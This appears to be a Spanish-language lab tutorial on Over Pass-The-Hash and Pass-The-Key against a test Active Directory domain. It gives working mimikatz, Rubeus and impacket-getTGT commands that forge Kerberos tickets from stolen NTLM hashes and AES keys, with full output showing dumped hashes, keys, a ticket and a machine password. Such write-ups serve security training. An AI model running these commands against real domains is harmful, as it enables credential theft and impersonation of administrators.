---
icon: keycdn
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Over Pass-The-Hash - Pass-The-Key

Lo que se va a realizar en esta tecnica es que cuando se realiza una autenticacion de `kerberos` este consulta en la `clave privada` cifrada con un `hash` del usuario que esta escrita en memoria ya para poder darle el `Ticket` de servicio, pues esta tecnica consiste en sobreescribir esta parte de la memoria por el `hash` que nosotros queramos poner ahi, para posteriormente poder obtener ese `ticket` y podernos hacer pasar por dicho usuario del `hash` que hayamos insertado en dicha memoria.

Vamos a utilizar `mimikatz` en este caso, como hemos visto antes podremos obtener el `hash` del usuario en las `logon sessions` del proceso `lsass` volcandolo con `mimikatz`.

Y despues realizabamos la tecnica de `pth` con el `mimikatz` para obtener una shell como el usuario `administrador` en `cmd`, en la informacion que nos daba, que era algo asi:

```
user    : Administrator
domain  : corp.local
program : cmd.exe
impers. : no
NTLM    : a87f3a337d73085c45f9416be5787d86
  |  PID  3448
  |  TID  3228
  |  LSA Process is now R/W
  |  LUID 0 ; 7674536 (00000000:00751aa8)
  \_ msv1_0   - data copy @ 00000224E7C04E80 : OK !
  \_ kerberos - data copy @ 00000224E7D777C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000224E7679D38 (32) -> null
```

Vemos en esta parte de aqui:

```
msv1_0   - data copy @ 00000224E7C04E80 : OK !
```

Que estaba sobreescribiendo en la direccion de memoria `00000224E7C04E80` del proceso `lsass` el `hash` que nosotros le habiamos pasado del `administrador` mediante el paquete de autenticacion `msv1_0` que se corresponde con el paquete de autenticacion `NTLM`, pero si seguimos viendo, seguidamente veremos esto:

```
kerberos - data copy @ 00000224E7D777C8
```

Vemos que tambien nos esta sobreescribiendo la direccion de memoria `00000224E7D777C8` donde esta el `hash` que se almacena de la autenticacion de `kerberos` por nuestro `hash` que hemos metido con `mimikatz` pudiendo realizar asi tambien acciones respecto al `dominio`.

Por ejemplo, si nosotros ponemos esto, cuando obtenermos el `cmd` autenticados como el `administrador` en los 2 protocolos:

```cmd
dir \\DC01\c$
```

Veremos que si nos deja listar ya que sobreescribimos nuestro `hash` tambien en el de `kerberos` que es el que se encarga del `dominio` en estos casos de autenticacion frente a un `dominio` y si lo hicieramos con una `IP` seria mediante la autenticacion `NTLM`.

Con `Rubeus.exe` podremos solicitar un `TGT` como el usuario `Administrador` con el `hash NTLM` que obtuvimos anteriormente, para que nos lo proporcione el mismo `kerberos`.

Abrimos una `PowerShell` como `administrador` local:

```powershell
cd C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug
.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: a87f3a337d73085c45f9416be5787d86
[*] Building AS-REQ (w/ preauth) for: 'corp.local\Administrator'
[*] Using domain controller: 192.168.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIFGDCCBRSgAwIBBaEDAgEWooIELjCCBCphggQmMIIEIqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMC
AQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggPqMIID5qADAgESoQMCAQKiggPYBIID1GfEEWb8Ql2n
gZfBjSKd0U9o/R0qQx0h/6/GQIenH+7CdaaYZbuyf6EXaFWMtQtUowETn7/ipVO7kS9lfbLtXHIt1isV
a22TXTycnql6DLgRL0Rqpk/1c+Xycj3kT33UB99icw8OtxB6xND0+VDSGRyjMDQYp8x+HAsZ7HN7GZSg
iQPHbQ57fO7+Re1xRNy6O7a611AFHP9IMhULUtLNxhc49FQIo/AZHDG0JKSEtQ0vbhA4ZWuLYvxiGYZM
tBB7tirNY2d6rP1VAObTmZ2XgbrXnGqIfKwdzBZfS9ZIDxuFMHfgnOolXboCrYlyNcn5XZnMBCcQ0m3C
D0ElH+mHElFjSUCJ8goRZoZe8pL6nT1XGNsaHFrlOPYZ0QQCkcX7huwoSCdwCTNWPtm2Hm5uAU0GN3As
FiB3nHrCNGwoq5ZEbhvSWU48ElAF5UWghjqjGXyfgtwbnUht0vFNG0apgDN3hrvUUl/SGmogagDr27Mr
LXJqhY6pYHWJLRY4FPhHf7hheV2rrTjq0vWJMLZZHYK23825oPaLMsuRBbUvoBOFNscxTnJgvK55CueC
deV4D+Z9cQx6uap/pU1J11eOGFyxqr0kt3eLjK4xLLpmcViuntoQ+mhPgDSqs0STzyPnRfJBsjpgKKOn
qbwCOh1p7j/UmBz/inaOBpt9vg/VYWwHcip3u4rql2pZjqOodxTOn/Lyg+vddCLYK8hjxfUQc3mW3H3P
9FSH+r0MW7KWwep1meKGTzjn4HcpMfYPh1+nZ0DPwyyPIExXFZbPKeh2k8Ie9IXTDpUtrmWRlvoX9cos
SLUEoaUDq8Ylccy8GT2l1NJQZqf9rVM6LNuVlxG4aLAUACzHp/D1tu2qs2h77/ZiImQ4Ld0Lgb6zcWzm
gj3g/Kpr9XUvlOHR3u50fIA2CLUjFHC5SPpWBpwsPSiydfowhE4lGOKE6NIOcjWhU4jtW6b7sL5oGhSs
OiPWqYNyF7VvLUAXv2P6D6sKs/fQBjgYvgouCESIUfIBsCZVESUWCH9PbY26Cn+5DxqQeWg03h0Am8S+
SOLByiKVQODj8xFxM9ZnXiLyEdlFfXSsfutV+RGplLlHfYL4dzL9DrNS0hdeWLF3WAfJA9YYTMg41zJQ
vr35xj3dJJ/lwCgtgwO3wY31i+GaC0Yz6IzCg2R4B/133+XqC/URMssbvEbO4I83496QoYJ+lx5A357C
Vpfl0v85oAZSEuGGuBild2M88hFds4ho++5dvLbdH6DoNZoGE4mX/OxkVDSyWGkNcGi08bLEBGbr8uQ5
JpG8a2ZpJL0pmvg4o4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigGzAZoAMCARehEgQQcG/p
D+0SN9AsGx9DRxq8qaEMGwpDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUA
QOEAAKURGA8yMDI1MDEyMTA5MTcyMFqmERgPMjAyNTAxMjExOTE3MjBapxEYDzIwMjUwMTI4MDkxNzIw
WqgMGwpDT1JQLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwpjb3JwLmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/corp.local
  ServiceRealm             :  CORP.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CORP.LOCAL
  StartTime                :  21/01/2025 10:17:20
  EndTime                  :  21/01/2025 20:17:20
  RenewTill                :  28/01/2025 10:17:20
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  cG/pD+0SN9AsGx9DRxq8qQ==
  ASREP (key)              :  A87F3A337D73085C45F9416BE5787D86
```

Y vemos que hemos obtenido perfectamente el `TGT` del usuario `Administrador`.

Todo este proceso se llama `Over PTH` por que estamos cogiendo el `hash NTLM` y lo utilizamos primero en el protocolo de autenticacion `NTLM` que es donde debe utilizarse, y hacemos un `over` lo volvemos a utilizar en este caso para el protocolo de autenticacion `kerberos`

Nosotros podremos listar de la misma forma que lo hacemos con los `hashes NTLM` las claves que estan inyectadas en memoria de `kerberos` con la herramienta `mimikatz`:

Ejecutaremos `mimikatz`:

```powershell
sekurlsa::
```

Nos aparecera el `help` del comando y nos interesaran estas opciones:

```
		   tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
```

Por lo que haremos lo siguiente:

```powershell
sekurlsa::ekeys
```

Info:

```
Authentication Id : 0 ; 5869195 (00000000:00598e8b)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 21/01/2025 10:28:20
SID               : S-1-5-21-3352250647-938130414-2449934813-500

         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
         * Key List :
           des_cbc_md4       db7e98b663293b6af815f7c70cc8b33ca68cb4b01039b768e24c1823fdf762cd
           des_cbc_md4       a87f3a337d73085c45f9416be5787d86
           des_cbc_md4       a87f3a337d73085c45f9416be5787d86
           des_cbc_md4       a87f3a337d73085c45f9416be5787d86
           des_cbc_md4       a87f3a337d73085c45f9416be5787d86
           des_cbc_md4       a87f3a337d73085c45f9416be5787d86

Authentication Id : 0 ; 481707 (00000000:000759ab)
Session           : Interactive from 1
User Name         : empleado1
Domain            : CORP
Logon Server      : DC01
Logon Time        : 21/01/2025 9:14:40
SID               : S-1-5-21-3352250647-938130414-2449934813-1104

         * Username : empleado1
         * Domain   : CORP.LOCAL
         * Password : (null)
         * Key List :
           des_cbc_md4       0fb09c66d747b41162bc91719f4131179a0203c2152bd3ea96ef1a394f981775
           des_cbc_md4       1791df33b45987df23e4fe6c57ea6de7
           des_cbc_md4       1791df33b45987df23e4fe6c57ea6de7
           des_cbc_md4       1791df33b45987df23e4fe6c57ea6de7
           des_cbc_md4       1791df33b45987df23e4fe6c57ea6de7
           des_cbc_md4       1791df33b45987df23e4fe6c57ea6de7

Authentication Id : 0 ; 76456 (00000000:00012aa8)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 21/01/2025 9:14:18
SID               : S-1-5-90-0-1

         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
         * Key List :
           des_cbc_md4       b459ebc8222bf5569aeaf1e80cfaadd6acdec1aeeb9d50b068d37cb8883c70f5
           des_cbc_md4       810f872d2ccb9f2dae00f095f34296aa
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8

Authentication Id : 0 ; 76424 (00000000:00012a88)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 21/01/2025 9:14:18
SID               : S-1-5-90-0-1

         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
         * Key List :
           des_cbc_md4       b459ebc8222bf5569aeaf1e80cfaadd6acdec1aeeb9d50b068d37cb8883c70f5
           des_cbc_md4       810f872d2ccb9f2dae00f095f34296aa
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 21/01/2025 9:14:18
SID               : S-1-5-20

         * Username : ws01$
         * Domain   : CORP.LOCAL
         * Password : (null)
         * Key List :
           des_cbc_md4       9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8

Authentication Id : 0 ; 53105 (00000000:0000cf71)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 21/01/2025 9:14:17
SID               : S-1-5-96-0-1

         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
         * Key List :
           des_cbc_md4       b459ebc8222bf5569aeaf1e80cfaadd6acdec1aeeb9d50b068d37cb8883c70f5
           des_cbc_md4       810f872d2ccb9f2dae00f095f34296aa
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8

Authentication Id : 0 ; 53092 (00000000:0000cf64)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 21/01/2025 9:14:17
SID               : S-1-5-96-0-0

         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
         * Key List :
           des_cbc_md4       b459ebc8222bf5569aeaf1e80cfaadd6acdec1aeeb9d50b068d37cb8883c70f5
           des_cbc_md4       810f872d2ccb9f2dae00f095f34296aa
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 21/01/2025 9:14:17
SID               : S-1-5-18

         * Username : ws01$
         * Domain   : CORP.LOCAL
         * Password : (null)
         * Key List :
           des_cbc_md4       9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
           des_cbc_md4       afc5c02d936d73808ce716070e883ab8
```

Aqui veremos las `claves` de cada uno de los usuarios que estan inyectadas en memoria pero del protocolo `kerberos`.

Aqui estamos viendo que nos muestra el mismo `hash` que cuando volcabamos el `NTLM` del `administrador` pero aunque ponga `des_cbc_md4` lo estamos viendo en `rc4` como antes estabamos forzando la autenticacion con `Rubeus` a `kerberos` y el primero de todos que es el mas largo esta cifrado el `hash` original que vemos abajo con el cifrado `AES-256` que es el que utiliza por defecto `kerberos` ya que es mas seguro, pero los 2 tipos de `hashes` los soporta `kerberos` como hemos visto antes.

Si por ejemplo queremos utilizar el `hash` `AES-256` para la herramienta `Rubeus.exe` lo haremos de la siguiente forma:

```powershell
.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /aes256:db7e98b663293b6af815f7c70cc8b33ca68cb4b01039b768e24c1823fdf762cd /ptt
```

Y esto nos volcara la misma informacion que cuando utilizamos el `rc4` con el `hash NTLM`.

Pero esta tecnica que cabamos de utilizar con el `hash` de `kerberos` del `AES-256` se le llama `Pass-The-Key`.

Si queremos obtener el `TGT` del `administrador` como hemos echo con `Rubeus` pero en `kali` lo podremos hacer de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
192.168.5.5           corp.local
```

Lo guardamos y ejecutamos lo siguiente:

```shell
impacket-getTGT corp.local/Administrator -hashes :a87f3a337d73085c45f9416be5787d86
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

Vemos que se guardo correctamente, ahora si lo leemos nos apareceran caractares raros, pero es por que nos ha volcado el `TGT` en un archivo directamente, en vez de por la pantalla.
